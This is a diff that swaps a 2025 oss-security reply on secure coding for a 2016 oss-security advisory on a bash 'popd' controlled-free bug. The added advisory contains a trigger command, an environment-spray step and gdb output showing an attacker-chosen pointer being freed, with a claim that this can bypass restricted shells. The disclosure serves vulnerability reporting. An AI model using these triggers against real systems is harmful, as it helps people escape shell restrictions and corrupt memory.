@@ -1,4 +1,9 @@
-Received: (qmail 26534 invoked by uid 550); 28 Sep 2025 14:51:33 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1410" "Thursday" "17" "November" "2016" "12:04:49" "-0500" "=?UTF-8?B?RmVybmFuZG8gTXXDsW96?=" "fernando@null-life.com" "<CAEr-gPFsVAB+5KrxRigmb=TkuSPxdGAW-GZ6cdQemxmJf2CFUA@mail.gmail.com>" "46" "[oss-security] bash - popd controlled free" nil nil nil "11" "2016111717:04:49" "[oss-security] bash - popd controlled free" (number mark "U       fernando@nul Nov 17   46/1410  " thread-indent "\"[oss-security] bash - popd controlled free\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 18159 invoked by uid 550); 17 Nov 2016 17:05:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,142 +12,83 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 30478 invoked from network); 28 Sep 2025 03:35:35 -0000
+Received: (qmail 18128 invoked from network); 17 Nov 2016 17:05:01 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1759030527; x=1759635327; darn=lists.openwall.com;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=EThvQSEsdZASVxNngwA6EkJ6cLFqefdGwup77fJirPM=;
-        b=XcIGJI0LyQO75ZPjSf8X0Nsyh3c6LxorxUu8xKL1If5QCyG2tvUJuctB9EKuvbwnZ5
-         Opm+xu2slQ6DdWYOhW+G1FCqHFKwpzOZkddSlfrgvG3BdkDJaxUFAu1etSN0ILzlOu+1
-         2EEitO/avsw7A1KANZvWAyJOCuGlkh0/ee+9CbAVgzK2R0ZTskODcH+++Vjt85UlMnu0
-         Yn/xbUis/RQtumwz3CIXQbXkOZApoLaQefsHidxghLK4HbuFHRkRAWznNau9d58KZOwe
-         p4FXFQbLXGF9tZiJ71OE4SDLUQl8VFU9rIQiExphGjX2B09anx05f3c+OoMFvlGL2S+W
-         RTCw==
+        d=null-life-com.20150623.gappssmtp.com; s=20150623;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=Mj+4UgrOgMLW7uuYQas7L3QpRSOft2l7N/o92EoQGM8=;
+        b=yYyoHol3M7KHCwWQEtQlHsRalHRE6+cLGW49hKxxlJp5918gg/fkhLFJS9YhCcd/mJ
+         ZfhJ6SV94ZcBfFALGBKjNb4f+lH7ysB5HWUVYFYanCXV4mKDZQMcNgiCZw99XeHXssw9
+         /idRxxns2xKg6NVcxznKbF2hl2GxD2CfieZgraX0XEIh0KrNzNED47ShppNC6J5oYZoe
+         LavHq5fCSI37uRUpynzWWRtRzW2lV6ejI0ToMnJlThAdxJ1Y+IQHNWzI+/Hn7ABABucD
+         VCvH8bu9XVuhEPCjqppvLU7+kXSaLJtR5RArFLAn30/CX3CdIxYDvU/dmP4YgUHm24ty
+         d4Kg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1759030527; x=1759635327;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=EThvQSEsdZASVxNngwA6EkJ6cLFqefdGwup77fJirPM=;
-        b=bn5FcCuhECTIP+WljM1Km1spRunIomQUpZ2QbAv2nLojkfdQbelsfqaJ8nodKSBSEv
-         KL6vujd9cjNNaXZFtNe7DzcBzG69B+TTh9Nd9kTggNTDa3dLZZFwViD+Y2uogEz8UPtR
-         I2fR7eXgNqJDTmim91luRBsu48xlD1rNojVmLttHdIrRgkQ3OOdSQRE8nYYhl0iEsx1S
-         +4/Wuk0Z2J+PCXeQ7vieu9/+tbAW864frJwLBrHVCgZ3Y6UGH48xJnntO34iUOfiyq6v
-         nuIdla6QeOFJ73HBuEWsNke/0F62TDhY4rkp7u05/DyxyoxBlwvaOM6pU6/7jbhU/soJ
-         U0EA==
-X-Gm-Message-State: AOJu0YxEfgAguiloXKLUUzcetl6AOiGiHymH1Ss1aKhJd32vQw2QFvSI
-	bL0Mj4+sulJf4yTItOU2EfnWpMxo5oHmSWaNLem+SybGlqrOMPVHP4Df5Z7LiY2/8Al+qiXvhaG
-	kb/jQA4yPL4XzNBKVVKkfrW1DQYGpfS/KQSEU
-X-Gm-Gg: ASbGncuFcIgrfI/fofRZInDE1MjciBjAIgU4dmqzU+gm4MBf/vbtR1khLc2Y+PXY9Mz
-	PKNemFhj5Oe8IF9NTEGRA5AAGbAIGiWOI+CujbW75OFbh8qyBcLSp+53jUx8fWLFJ/eD9s/gYuC
-	fL9wrBuells2FeEyftv4Jt5BwOv24bcGPNb6sQdRhk37pXXP7Li3WEOiV0JVo2qoH7D4d4uF15F
-	C5BLvP7LW1Vp5MGqHKaeBHtdRuu030Ymh8A3TYpBg==
-X-Google-Smtp-Source: AGHT+IGOIly3AHC2o5VcwrbxT3RMMqBkMmseRqRkMQJAtsCg5xhGjJ+zebQSCFWmnP/gYRP5gtJtCEY6BxmT6TNTNVw=
-X-Received: by 2002:a05:690e:1a9e:b0:635:4ece:20ad with SMTP id
- 956f58d0204a3-6361a8734dcmr10094990d50.50.1759030526453; Sat, 27 Sep 2025
- 20:35:26 -0700 (PDT)
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=Mj+4UgrOgMLW7uuYQas7L3QpRSOft2l7N/o92EoQGM8=;
+        b=hSH2z1p/THEAfCN3d1poHB5Cr0o7ahqT3R0rOKTmbb0t9PmQyn52SPoj2SeviBJ3w9
+         xozcu82fFDXYuDSue8KNe1tELXDALP4JL94wZ+Za84JzZsLCaN9erPO8pdmO/bBdPDTv
+         1WjqLQWDGBig8wxOyEp+XcprAI/knKKxzgu0xVzRqUv/TURSkgX3MYznWnMwoM9Tscs0
+         AmTKkgLJcyJhyi/3oQwBPxiClQHOoL4SJxMLk7LhraKFThJ3iT0C+pnfgji0Yk3B+1z3
+         bRKACnmPRKgY93YvD08imKPvGcuUm2kXF67eUN84N6hbdzjCiHRScD7P2zXAz505ia4w
+         fhqw==
+X-Gm-Message-State: AKaTC02G78XnxP4fZjdiiT3Rv9gaNak83y+yvfukYMnYPnMrqkZUvwS2W+XEhcjmybvfN06yhr7EgeRxz4Bqpg==
+X-Received: by 10.237.53.176 with SMTP id c45mr2796328qte.222.1479402289566;
+ Thu, 17 Nov 2016 09:04:49 -0800 (PST)
 MIME-Version: 1.0
-References: <CAFf+5ziKPTBLFmDAffWTH+MCnOp5NHhZNM803PsemVLRuQoCaQ@mail.gmail.com>
- <20250927214013.GA9163@openwall.com>
-In-Reply-To: <20250927214013.GA9163@openwall.com>
-From: Amit <amitchoudhary0523@gmail.com>
-Date: Sun, 28 Sep 2025 09:05:15 +0530
-X-Gm-Features: AS18NWDzp-Jla2no79RU6wz2-2DAhu7S3ow8H0y2wMFcb1195FsHRxOc09CeJd8
-Message-ID: <CAFf+5ziVBQ-xk=VQdrbnhgzdu1gu==ZQSrhBGj7PEq6mcOVVAw@mail.gmail.com>
+X-Originating-IP: [190.109.97.221]
+From: =?UTF-8?Q?Fernando_Mu=C3=B1oz?= <fernando@null-life.com>
+Date: Thu, 17 Nov 2016 12:04:49 -0500
+Message-ID: <CAEr-gPFsVAB+5KrxRigmb=TkuSPxdGAW-GZ6cdQemxmJf2CFUA@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000adadf7063fd435c1"
-Subject: Re: [oss-security] How to do secure coding and create secure software
+Cc: Chester Ramey <chet.ramey@case.edu>
+Content-Type: text/plain; charset=UTF-8
+Subject: [oss-security] bash - popd controlled free
 
---000000000000adadf7063fd435c1
-Content-Type: text/plain; charset="UTF-8"
+bash - popd controlled free
+====================
 
-On Sun, 28 Sept 2025 at 03:11, Solar Designer <solar@openwall.com> wrote:
+popd can be tricked to free a user supplied address in the following way:
 
->
-> You claim that "If functions/methods are secure then the whole software
-> is secure."  If we talk C where main() is also a function, and limit the
-> definition of "whole software" to one program, then I'd agree - your
-> claim can as well directly say "if [all functions including] main() are
-> secure then the whole software [meaning this one program only] is
-> secure."  While true, under those definitions this isn't a useful claim.
->
-> However, if in "functions/methods are secure" you refer only to smaller
-> building blocks, then no, the program built from them may still be
-> insecure.  Also "the whole software" isn't necessarily just one program.
->
->
-Everyone has said more or less the same thing that even if in a software
-all functions are secure then this doesn't mean that the software will be
-secure.
+$ popd +-111111
 
-But the point is that this is what people have said and this is all
-theoretical.
+This could be used to bypass restricted shells (rsh) on some
+environments to cause use-after-free.
 
-Can someone give an example as to how a software made up of secure
-functions can be hacked?
+This was already reported to bash devs and only considered a bug, if
+Mitre consider it could have a security impact, please assign a CVE.
 
-Let's assume that there are 2 (or more) different software and all the
-functions in all the software are secure and these software are interacting
-with each other. Then how can they be hacked? Can someone give an example.
+Details
+======
+$ gdb bash
+...
+(gdb) r -c 'popd +-67372036'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/bashinstrumentado/bash-4.3/bash -c 'popd +-67372036'
 
-I don't agree with theoretical assumptions.
+Program received signal SIGSEGV, Segmentation fault.
+0x0827f93a in popd_builtin (list=<optimized out>) at ./pushd.def:384
+384          free (pushd_directory_list[i]);
+(gdb) print pushd_directory_list[i]
+Cannot access memory at address 0x10101010
 
-Someone also mentioned that secure functions having limits on arguments can
-result in DoS. In my opinion, DoS is better than getting hacked.
+----
+$ export AA=`perl -e 'print "A"x100000'`
+$ gdb ./bash
+...
+(gdb) x/s *((char **)environ+13)
+0xbffe75d4:    "AA=", 'A' <repeats 197 times>...
+(gdb) run -c 'popd +-805281142'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/bash/bash-4.3/bash -c 'popd +-805281142'
 
-But still, the main point is that can someone give an example of how a
-software made up of all secure functions be hacked? I request for an
-example (not theoretical statements).
+Program received signal SIGSEGV, Segmentation fault.
+internal_free (mem=0x41414141, file=0x83fb36c "./pushd.def", line=384,
+flags=<optimized out>) at malloc.c:863
+863      if (p->mh_alloc == ISMEMALIGN)
 
-Or, some example that happened in the past in the real world? I will
-analyze that.
 
-Amit
-
---000000000000adadf7063fd435c1
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-<div dir=3D"ltr"><div dir=3D"ltr"><br></div><div class=3D"gmail_quote gmail=
-_quote_container"><div dir=3D"ltr" class=3D"gmail_attr">On Sun, 28 Sept 202=
-5 at 03:11, Solar Designer &lt;<a href=3D"mailto:solar@openwall.com">solar@=
-openwall.com</a>&gt; wrote:<br></div><blockquote class=3D"gmail_quote" styl=
-e=3D"margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);paddin=
-g-left:1ex"><br>
-You claim that &quot;If functions/methods are secure then the whole softwar=
-e<br>
-is secure.&quot;=C2=A0 If we talk C where main() is also a function, and li=
-mit the<br>
-definition of &quot;whole software&quot; to one program, then I&#39;d agree=
- - your<br>
-claim can as well directly say &quot;if [all functions including] main() ar=
-e<br>
-secure then the whole software [meaning this one program only] is<br>
-secure.&quot;=C2=A0 While true, under those definitions this isn&#39;t a us=
-eful claim.<br>
-<br>
-However, if in &quot;functions/methods are secure&quot; you refer only to s=
-maller<br>
-building blocks, then no, the program built from them may still be<br>
-insecure.=C2=A0 Also &quot;the whole software&quot; isn&#39;t necessarily j=
-ust one program.<br><br></blockquote><div><br></div><div>Everyone has said =
-more or less the same thing that even if in a software all functions are se=
-cure then this doesn&#39;t mean that the software will be secure.</div><div=
-><br></div><div>But the point is that this is what people have said and thi=
-s is all theoretical.</div><div><br></div><div>Can someone give an example =
-as to how a software made up of secure functions can be hacked?</div><div><=
-br></div><div>Let&#39;s assume that there are 2 (or more) different softwar=
-e and all the functions in all the software are secure and these software a=
-re interacting with each other. Then how can they be hacked? Can someone gi=
-ve an example.</div><div><br></div><div>I don&#39;t agree with theoretical =
-assumptions.</div><div><br></div><div>Someone also mentioned that secure fu=
-nctions having limits on arguments can result in DoS. In my opinion, DoS is=
- better than getting hacked.</div><div><br></div><div>But still, the main p=
-oint is that can someone give an example of how a software made up of all s=
-ecure functions be hacked? I request for an example (not theoretical statem=
-ents).</div><div><br></div><div>Or, some example that happened in the past =
-in the real=C2=A0world? I will analyze that.</div><div><br></div><div>Amit<=
-/div><div><br></div></div></div>
-
---000000000000adadf7063fd435c1--
+- Fernando
